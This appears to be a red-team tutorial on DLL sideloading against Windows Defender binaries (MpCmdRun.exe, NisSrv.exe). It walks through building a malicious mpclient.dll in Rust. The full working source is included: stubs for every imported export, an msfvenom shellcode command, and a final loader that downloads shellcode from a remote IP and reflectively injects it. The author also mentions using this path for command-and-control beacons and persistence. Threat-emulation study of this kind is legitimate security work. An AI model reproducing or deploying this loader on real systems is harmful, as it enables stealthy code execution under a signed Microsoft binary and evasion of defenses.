# DLL HIJACKING

---

## **What is DLL Injection?**

DLL injection is a technique used to alter the behavior of a running process by introducing external code into its address space. This external code is typically a Dynamic Link Library (DLL), which can be loaded and executed dynamically by the target process. By injecting a DLL, the attacker or developer can manipulate the process's functionality without modifying its original code.

This method leverages the capabilities of Windows' DLLs, which are designed to allow code and data to be shared among multiple applications. While DLL injection can be used for legitimate purposes, such as debugging and testing, it is also a common tactic in cyberattacks to execute malicious operations within a target process. The injected DLL can perform various actions, from altering the process's behavior to stealing sensitive information.

## How does DLL Injection Work?

DLL injection works by introducing a dynamic link library (DLL) into the address space of a running process. This is typically achieved through several methods, each leveraging the inherent capabilities of Windows' DLLs. The process begins with identifying the target process into which the DLL will be injected. Once identified, the attacker or developer allocates memory within the target process to accommodate the DLL.

Next, the DLL is written into the allocated memory space. This can be done using various techniques such as code injection, where the DLL is directly inserted into the process's memory, or reflective DLL injection, which loads the DLL from memory without relying on Windows API functions. After the DLL is successfully injected, the final step involves executing the code within the DLL to manipulate the target process's behavior.

**There’s a database of hijackable dlls called hijacklibs**

https://hijacklibs.net/

**The one I’ll target is mpclient.dll. This is a dll loaded by windows defender.**

![Screenshot 2026-01-01 at 12.40.04 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.40.04_AM.png)

---

### mpclient.dll

#### This dll is loaded by windows defender is in fact vulnerable to dll hijacking.

There are two executable inside windows defender directory that load or try to load mpclient.dll.

The following executables attempt to load `mpclien.dll`

- [`%PROGRAMFILES%\Windows Defender\mpcmdrun.exe`](https://hijacklibs.net/#app:%25PROGRAMFILES%25%5CWindows%20Defender%5Cmpcmdrun.exe)  - commandline management tool for defender.
- [`%PROGRAMFILES%\Windows Defender\nissrv.exe`](https://hijacklibs.net/#app:%25PROGRAMFILES%25%5CWindows%20Defender%5Cnissrv.exe)

---

Let’s watch the load of dll’s from these programs in procmon just to see what it looks like once we have known targets.

For simplicity sake I’ve transferred these two into separate directory.

![Screenshot 2026-01-01 at 12.49.05 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.49.05_AM.png)

---

Procmon fillters.

![Screenshot 2026-01-01 at 12.52.09 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.52.09_AM.png)

![Screenshot 2026-01-01 at 12.55.01 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.55.01_AM.png)

mpclinet.dll present in the original directory. but because we can copy this binary anywhere in the system and use it. It’s going to look like signed microsoft programis running the dll that we want to run if we move that file anywhere else. This technique sometime known as `dll side loading`. rather than dll hijacking.

![Screenshot 2026-01-01 at 12.58.49 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.58.49_AM.png)

#### We don’t yet know the functions mpcmd or nissrv actually use inside the dll so first thing thing you might try is to write a dll that uses dll main to do what we want. That may not work depending on the dll is used in the binary. But we can always give it a try.

here we have a evil.dll program in rust.

```bash
cargo new --lib evildll
```

Cargo.toml

```toml
[package]
name = "evildll"
version = "0.48.0"
edition = "2024"

[lib]
crate-type = ["cdylib"]

[dependencies]

[dependencies.windows]
version = "0.48.0"
features = [
	"Win32_Foundation",
	"Win32_System_SystemServices",
	"Win32_Security",
	"Win32_System_Memory",
	"Win32_System_Threading",
	"Win32_System_WindowsProgramming",
	"Win32_System_Diagnostics_Debug",
	"Win32_UI_WindowsAndMessaging"
]
```

lib.rs

```rust
use windows::{
    core::PCSTR,
    Win32::{
        UI::WindowsAndMessaging::{
            MessageBoxA,
            MESSAGEBOX_STYLE
        },
        Foundation::{
            BOOL,
            HANDLE,
            HWND,

        }
    }
};

#[unsafe(no_mangle)]
extern "C" fn main() {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR("Dll hijacked\x00".as_ptr()),
            PCSTR("oh baby..\x00".as_ptr()),
            MESSAGEBOX_STYLE(0)
        );
    }
}

#[unsafe(no_mangle)]
#[allow(non_snake, unused_variables)]
extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    lpv_reserved: &u32
) -> BOOL {
    match call_reason {
        _ => {
			      main();
            return BOOL(1);
        }
    }
}
```

Cross compilation.

```bash
cargo build --release --target x86_64-pc-windows-gnu
```

 

---

right now we are not doing anything inside dll main except returning true. Because we don’t know what functions yet that mpcmd run or nisserv.exe use from mpclient.dll. We’re going to use dll main just to see if it uses that default entry point.

Let’s just copy evil.dll into the same folder that my copied over Defender binaries are, so that will be the first place that the program look for the dll it’ll find corrrectly named one. and the we’ll see what happens.

We don’t get what we want. But we do get a hint.

![Screenshot 2026-01-01 at 1.16.26 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.16.26_AM.png)

Let’s try nisserv

This time we get.

![Screenshot 2026-01-01 at 1.17.33 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.17.33_AM.png)

#### So we now know about two different functions that these libraries required and we need to spoof them at least those in order for this to work. 

#### In order for us to understand all of the functions we’re going to need to spoof.

Let’s use cutter to examine these programs.

As a defender mpcmd run executing on the system all the time so as an attacker that would be the one I choose over nisserv.exe.

![Screenshot 2026-01-01 at 1.23.35 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.23.35_AM.png)

We don’t need to read assembly for this part.

`We will look at imports. we need to look what it import from mpclient.dll`

![Screenshot 2026-01-01 at 1.25.25 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.25.25_AM.png)

---

#### We don’t know how these functions work together. The safest thing to do is to spoof all of them.

#### First thing we want to do is get list of functions. get it out of cutter into something more usable.

#### **Unfortunately we can not copy all these from cutter we have to use PESTUDIO.**

Select all the mpclient.dll imports.

![Screenshot 2026-01-01 at 1.32.09 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.32.09_AM.png)

![Screenshot 2026-01-01 at 1.32.59 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.32.59_AM.png)

```bash
MpQueryEngineConfigDword
MpGetSampleChunk
MpConveySampleSubmissionResult
MpSampleSubmit
MpSampleQuery
MpUpdateStart
MpClientUtilExportFunctions
MpConfigInitialize
MpConfigOpen
MpWDEnable
MpUpdatePlatform
MpConfigUninitialize
MpConfigClose
MpFreeMemory
MpHandleClose
MpThreatOpen
MpThreatEnumerate
MpScanResult
MpManagerOpen
MpScanControl
MpScanStartEx
MpCleanOpen
MpCleanStart
MpConfigGetValue
MpUpdateStartEx
MpManagerVersionQuery
MpAddDynamicSignatureFile
MpUtilsExportFunctions
MpAllocMemory
MpConfigSetValue
MpRemoveDynamicSignatureFile
MpDynamicSignatureOpen
MpDynamicSignatureEnumerate
MpConfigGetValueAlloc
MpGetTaskSchedulerStrings
MpManagerStatusQuery
MpConfigIteratorOpen
MpConfigIteratorEnum
MpConfigIteratorClose
MpNetworkCapture
MpConfigDelValue
MpManagerEnable
MpQuarantineRequest
MpManagerStatusQueryEx
```

---

Replace the beginning of the line with `extern “C” fn main` 

![Screenshot 2026-01-01 at 1.38.22 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.38.22_AM.png)

---

And end of the line with `() { main(); }` 

![Screenshot 2026-01-01 at 1.41.06 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.41.06_AM.png)

Lastly edit beginning of line with `#[unsafe(no_mangle)]\n`

![Screenshot 2026-01-01 at 1.44.02 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.44.02_AM.png)

---

now copy all and move it to [lib.rs](http://lib.rs) and remove the main function invocation.

like this

```bash
use windows::{
    core::PCSTR,
    Win32::{
        UI::WindowsAndMessaging::{
            MessageBoxA,
            MESSAGEBOX_STYLE
        },
        Foundation::{
            BOOL,
            HANDLE,
            HWND,

        }
    }
};

#[unsafe(no_mangle)]
extern "C" fn MpQueryEngineConfigDword() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpGetSampleChunk() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConveySampleSubmissionResult() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpSampleSubmit() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpSampleQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdateStart() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpClientUtilExportFunctions() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigInitialize() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpWDEnable() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdatePlatform() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigUninitialize() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpFreeMemory() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpHandleClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpThreatOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpThreatEnumerate() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanResult() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanControl() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanStartEx() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpCleanOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpCleanStart() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigGetValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdateStartEx() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerVersionQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpAddDynamicSignatureFile() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUtilsExportFunctions() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpAllocMemory() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigSetValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpRemoveDynamicSignatureFile() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpDynamicSignatureOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpDynamicSignatureEnumerate() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigGetValueAlloc() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpGetTaskSchedulerStrings() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerStatusQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorEnum() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpNetworkCapture() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigDelValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerEnable() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpQuarantineRequest() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerStatusQueryEx() { main(); } 

#[unsafe(no_mangle)]
extern "C" fn main() {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR("Dll hijacked\x00".as_ptr()),
            PCSTR("oh baby..\x00".as_ptr()),
            MESSAGEBOX_STYLE(0)
        );
    }
}

#[unsafe(no_mangle)]
#[allow(non_snake, unused_variables)]
extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    lpv_reserved: &u32
) -> BOOL {
    match call_reason {
        _ => {
            return BOOL(1);
        }
    }
}
```

now build it again.

```bash
cargo build --release --target x86_64-pc-windows-gnu
```

now copy our dll to the same directory where our defender binaries are.

Execute MpCmdRun.exe

And this time we get our popup msg.

![Screenshot 2026-01-01 at 1.55.49 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.55.49_AM.png)

### That is how you spoof function that are used by a program when it Imports dll’s.

---

### - Observe what it imports then write same functions that call your evil function inside of your rust program or any other language.

---

### So you may ask hey if we saw that error message when we tried to run MpCmdRun.exe with the dll without these spoofed functions. Couldn’t we just use that entry point and then just spoof that one. Wouldn’t that be enough.

---

Sometimes just doing the entry point is enough but sometimes it isn’t.
let’s demonstrate what happens when we try to do just that.
So we saw in that error message that the entry point we were told about at first was `MpQueryEngineConfigDword`

```bash
#[unsafe(no_mangle)]extern "C" fn MpQueryEngineConfigDword() { main(); } 
```

let’s comment out every other function and rebuild it. copy it over the same directory.

![Screenshot 2026-01-01 at 2.08.43 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_2.08.43_AM.png)

Execute the MpCmdRun.exe

#### now we get another error that `MpGetSampleChunk` is missing.

![Screenshot 2026-01-01 at 2.11.57 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_2.11.57_AM.png)

---

so what let’s add `MpGetSampleChunk` and compile it it again.

### **I think you can probably see where this is going. We will get a new error.**

**because we don’t really know exactly how the entry point are handled inside the dll at this level. It’s easiest to just take all the Imports and spoof all of them so there’s no questions about what actually needs to be spoofed. Yes it’s a little bit more copy paste but you have the guarantee that you’re going to hit the functions that you need to hit so it’s definitely worth it**

---

Okay now that we have the theory of the shim functions out of the way it’s time to weaponize this thing and actually add some offensive capabilities to our malicious dll we’re going to do that with process injection which is a way of injecting our own Shell Code into a running process into a running process either the one we’re currently in which is known as reflective injection or another process that we can gain access to gain a handle to that’s called remote process injection.

## **Red team threat emulation - Process Injection**

---

There’s a article from trend micro talks about the Earth Longzhi (a [subgroup of APT41](https://www.trendmicro.com/en_us/research/22/k/hack-the-real-box-apt41-new-subgroup-earth-longzhi.html)) t that in fact uses dll hijacking with this very dll mpclient.dll. 

[Attack on Security Titans: Earth Longzhi Returns With New Tricks](https://www.trendmicro.com/en_us/research/23/e/attack-on-security-titans-earth-longzhi-returns-with-new-tricks.html)

### So knowing how to move from that hijack to actual remote code execution os pretty valuable. One of the most common things you’re going to want to do is to establish a command and control beacon so that we have initial access or persistence. on the target. for simplicity sake i’ll spawn a calculator.

## Generate Payload

I’ll be using msfvenom to generate a shellcode which will spawn a calculator.

```bash
kant@APPLEs-MacBook-Pro ~/Desktop> /opt/metasploit-framework/bin/msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 276 bytes
Saved as: shellcode.bin
```

---

## Evill dll

No we’ll modify our evildll code.

- lib.rs

```rust
use windows::{
    core::PCSTR,
    Win32::{
        UI::WindowsAndMessaging::{
            MessageBoxA,
            MESSAGEBOX_STYLE
        },
        Foundation::{
            BOOL,
            HANDLE,
            HWND,

        }
    }
};

use bolus::{
    load,
    inject,
    injectors::{
        InjectionType,
        InjectorType
    }
};

#[unsafe(no_mangle)]
extern "C" fn MpQueryEngineConfigDword() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpGetSampleChunk() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConveySampleSubmissionResult() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpSampleSubmit() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpSampleQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdateStart() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpClientUtilExportFunctions() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigInitialize() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpWDEnable() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdatePlatform() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigUninitialize() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpFreeMemory() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpHandleClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpThreatOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpThreatEnumerate() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanResult() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanControl() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpScanStartEx() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpCleanOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpCleanStart() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigGetValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUpdateStartEx() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerVersionQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpAddDynamicSignatureFile() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpUtilsExportFunctions() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpAllocMemory() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigSetValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpRemoveDynamicSignatureFile() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpDynamicSignatureOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpDynamicSignatureEnumerate() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigGetValueAlloc() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpGetTaskSchedulerStrings() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerStatusQuery() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorOpen() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorEnum() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigIteratorClose() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpNetworkCapture() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpConfigDelValue() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerEnable() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpQuarantineRequest() { main(); } 
#[unsafe(no_mangle)]
extern "C" fn MpManagerStatusQueryEx() { main(); } 

#[unsafe(no_mangle)]
extern "C" fn main() {
    let injector_type = InjectorType::Url(
        "http://10.196.248.216/shellcode.bin".to_string(),
        true
    );
    let injector = load(injector_type).unwrap();
    inject(injector, InjectionType::Reflect, true).unwrap();

}

#[unsafe(no_mangle)]
#[allow(non_snake, unused_variables)]
extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    lpv_reserved: &u32
) -> BOOL {
    match call_reason {
        _ => {
            return BOOL(1);
        }
    }
}
```

---

- Add bolus to Cargo.toml

```toml
[package]
name = "mpclient"
version = "0.48.0"
edition = "2024"

[lib]
crate-type = ["cdylib"]

[dependencies]
bolus = "0.3.0"

[dependencies.windows]
version = "0.48.0"
features = [
	"Win32_Foundation",
	"Win32_System_SystemServices",
	"Win32_Security",
	"Win32_System_Memory",
	"Win32_System_Threading",
	"Win32_System_WindowsProgramming",
	"Win32_System_Diagnostics_Debug",
	"Win32_UI_WindowsAndMessaging"
]
```

---

Recompile it and execute it.

![Screen Recording 2026-01-01 at 12.gif](DLL%20HIJACKING/Screen_Recording_2026-01-01_at_12.gif)

---
